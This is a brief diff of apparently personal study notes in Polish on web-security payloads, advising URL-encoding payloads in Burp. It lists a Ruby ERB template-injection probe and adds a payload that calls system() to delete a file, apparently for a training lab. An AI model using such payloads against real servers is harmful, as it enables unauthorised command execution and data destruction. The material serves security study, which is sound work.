@@ -2,3 +2,4 @@ Warto jest kodowac payloady w burpie np. do url-a.
 
 [Ruby]
 <%= 7*7 %>
+<%= system("rm /home/carlos/morale.txt") %>   
